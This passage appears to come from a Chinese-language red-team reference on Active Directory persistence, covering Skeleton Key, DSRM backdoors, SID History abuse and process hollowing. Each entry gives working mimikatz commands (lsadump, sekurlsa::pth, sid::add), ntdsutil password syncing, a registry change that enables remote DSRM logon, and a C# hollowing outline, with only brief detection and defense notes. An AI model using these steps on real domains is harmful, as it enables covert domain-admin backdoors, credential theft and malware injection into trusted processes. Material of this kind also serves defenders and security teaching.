- `misc::skeleton` — 植入万能密码模块 _command_

**使用万能密码**
> 使用万能密码登录
_platform: windows_
```
万能密码: mimikatz
任何域用户都可以使用mimikatz作为密码登录
```

**检测方法**
> 检测Skeleton Key
_platform: windows_
```
检查LSASS内存:
Get-Process lsass
使用EDR检测内存注入
```


**概述：** Skeleton Key在内存中植入万能密码，不影响原密码。

**漏洞原理：** 域控制器LSASS可被注入。

**利用方法：** 利用流程：1) 获取域管权限 2) 访问DC 3) 植入后门

**防御措施：** 防御措施：1) 保护DC 2) 监控LSASS 3) 使用Credential Guard

---

### DSRM后门  `dsrm-backdoor`
_利用DSRM账户建立后门_
子类：**域后门** · tags: `dsrm` `backdoor` `domain`

**前置条件：**
- 域管理员权限
- 访问域控制器

**攻击链：**

**获取DSRM密码**
> 获取DSRM账户哈希
_platform: windows_
```
mimikatz # lsadump::lsa /patch /name:krbtgt
或
mimikatz # token::elevate
mimikatz # lsadump::sam
```

**同步DSRM密码**
> 同步DSRM密码与域管理员
_platform: windows_
```
ntdsutil
set dsrm password
sync from domain account admin
q
q
```
**语法解析：**
- `ntdsutil` — AD数据库工具 _command_
- `sync from domain account` — 同步域账户密码 _keyword_

**启用DSRM账户**
> 允许DSRM账户远程登录
_platform: windows_
```
修改注册表:
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```

**使用DSRM登录**
> 使用DSRM账户
_platform: windows_
```
使用DSRM账户哈希:
mimikatz # sekurlsa::pth /domain:DC_NAME /user:Administrator /ntlm:HASH
或使用Pass-the-Hash
```


**概述：** DSRM是域控制器的本地管理员账户，可作为后门使用。

**漏洞原理：** DSRM账户独立于域账户，常被忽视。

**利用方法：** 利用流程：1) 获取DSRM哈希 2) 同步密码 3) 启用远程登录

**防御措施：** 防御措施：1) 监控DSRM密码变更 2) 检查注册表 3) 定期审计

---

### SID History后门  `sid-history`
_利用SID History建立后门_
子类：**域后门** · tags: `sid-history` `backdoor` `domain`

**前置条件：**
- 域管理员权限

**攻击链：**

**添加SID History**
> 添加SID History
_platform: windows_
```
mimikatz # sid::add /sam:backdoor_user /new:administrator
将域管SID添加到普通用户
```
**语法解析：**
- `sid::add` — 添加SID History _command_
- `/sam` — 目标用户 _parameter_
- `/new` — 要添加的SID _parameter_

**验证SID History**
> 检查SID History
_platform: windows_
```
Get-ADUser backdoor_user -Properties sidHistory
或
whoami /all
```

**使用后门**
> 使用后门账户
_platform: windows_
```
使用backdoor_user登录
自动获得域管理员权限
```


**概述：** SID History允许用户继承其他用户的权限。

**漏洞原理：** SID History可被滥用添加额外权限。

**利用方法：** 利用流程：1) 创建普通用户 2) 添加域管SID 3) 获得域管权限

**防御措施：** 防御措施：1) 监控SID History 2) 审计用户属性 3) 使用PAM

---

### 进程镂空持久化  `persistence-process-hollowing`
_利用进程镂空技术实现持久化_
子类：**进程注入** · tags: `process-hollowing` `persistence` `injection`

**前置条件：**
- 代码执行权限

**攻击链：**

**进程镂空原理**
> 进程镂空原理
_platform: windows_
```
1. 创建合法进程(挂起状态)
2. 替换进程内存
3. 恢复执行
```

**C#实现**
> C#进程镂空
_platform: windows_
```
using System.Runtime.InteropServices;
// 创建挂起进程
CreateProcess("C:\\Windows\\System32\\svchost.exe", ..., CREATE_SUSPENDED, ...);
// 替换内存
NtUnmapViewOfSection(...);
VirtualAllocEx(...);
WriteProcessMemory(...);
ResumeThread(...);
```

**检测方法**
> 检测进程镂空
_platform: windows_
```
检查进程内存:
- 进程路径与内存内容不匹配
- 异常的内存区域
- 使用EDR检测
```


**概述：** 进程镂空将恶意代码注入合法进程。

**漏洞原理：** Windows进程创建机制可被利用。

**利用方法：** 利用流程：1) 创建挂起进程 2) 替换内存 3) 恢复执行

**防御措施：** 防御措施：1) 使用EDR 2) 监控进程创建 3) 内存扫描

---
